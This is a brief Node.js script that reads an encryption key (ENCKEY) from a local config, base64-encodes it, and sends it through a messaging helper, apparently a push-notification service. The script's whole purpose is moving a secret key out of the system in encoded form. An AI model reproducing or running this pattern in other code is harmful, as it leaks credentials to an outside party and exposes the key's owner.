const axios = require("axios");
const tool = require("./tool.js");

(async function(){
    var ENCK = tool.getConfig().ENCKEY
    await tool.qmsg(Buffer.from(ENCK,'ascii').toString("base64"));
})()